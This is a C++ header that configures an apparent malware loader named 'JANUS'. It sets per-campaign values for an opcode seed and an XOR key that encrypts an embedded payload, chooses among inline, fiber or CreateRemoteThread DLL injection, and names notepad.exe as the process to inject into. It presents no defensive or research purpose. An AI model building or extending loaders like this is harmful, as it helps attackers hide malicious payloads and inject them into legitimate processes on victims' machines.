#pragma once
#include <cstdint>

// Per-campaign knobs. Change both values, then rebuild loader + rerun tools/embed_payload.py.
#define JANUS_OPCODE_SEED 0xDEADBEEFu
#define JANUS_XOR_KEY     0xC0FFEE4Au  // 32-bit seed for the payload keystream
#define JANUS_STACK_SIZE  (1u << 20)  // 1 MiB

// Injection technique: 0=inline, 1=fiber, 2=remote_thread (DLL injection)
#ifndef JANUS_INJECT_TECHNIQUE
#define JANUS_INJECT_TECHNIQUE  0
#endif

// Target process name for technique 2 (CreateRemoteThread DLL injection)
#define JANUS_TARGET_PROCESS  "notepad.exe"
